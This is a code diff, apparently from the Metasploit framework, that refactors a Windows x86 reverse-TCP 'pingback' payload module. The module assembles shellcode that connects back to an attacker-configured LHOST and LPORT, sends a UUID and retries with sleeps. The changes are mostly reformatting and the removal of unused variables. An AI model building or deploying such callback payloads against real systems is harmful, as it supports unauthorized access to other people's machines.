@@ -27,19 +27,16 @@ module MetasploitModule
       'Arch'          => ARCH_X86,
       'Handler'       => Msf::Handler::ReverseTcp,
       'Session'       => Msf::Sessions::Pingback
-      ))
+    ))
 
     def generate_stage
-      encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
-      encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
+      encoded_port = [datastore['LPORT'].to_i, 2].pack("vn").unpack("N").first
+      encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || "127.127.127.127").unpack("V").first
       retry_count  = [datastore['ReverseConnectRetries'].to_i, 1].max
       pingback_count = datastore['PingbackRetries']
       pingback_sleep = datastore['PingbackSleep']
-      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
-      self.pingback_uuid ||= self.generate_pingback_uuid
+      self.pingback_uuid ||= generate_pingback_uuid
       uuid_as_db = "0x" + self.pingback_uuid.to_s.gsub("-", "").chars.each_slice(2).map(&:join).join(",0x")
-      addr_fam      = 2
-      sockaddr_size = 16
 
       asm = %Q^
         cld                    ; Clear the direction flag.
@@ -120,20 +117,20 @@ module MetasploitModule
           push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
           call ebp                ; closesocket(socket)
         ^
-        if pingback_count > 0
-          asm << %Q^
-            mov eax, [esi+12]
-            test eax, eax               ; pingback counter
-            jz exitfunk
-            dec [esi+12]
-            sleep:
-              push #{(pingback_sleep*1000).to_s}
-              push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
-              call ebp                  ;sleep(pingback_sleep*1000)
-              jmp create_socket
-          ^
-        end
+      if pingback_count > 0
         asm << %Q^
+          mov eax, [esi+12]
+          test eax, eax               ; pingback counter
+          jz exitfunk
+          dec [esi+12]
+          sleep:
+            push #{(pingback_sleep * 1000)}
+            push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
+            call ebp                  ;sleep(pingback_sleep * 1000)
+            jmp create_socket
+        ^
+      end
+      asm << %Q^
           ; restore the stack back to the connection retry count
           pop esi
           pop esi
@@ -148,7 +145,7 @@ module MetasploitModule
           push ebx               ; push the hash of the exit function
           call ebp               ; ExitProcess(0)
       ^
-    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
+      Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
     end
   end
 end
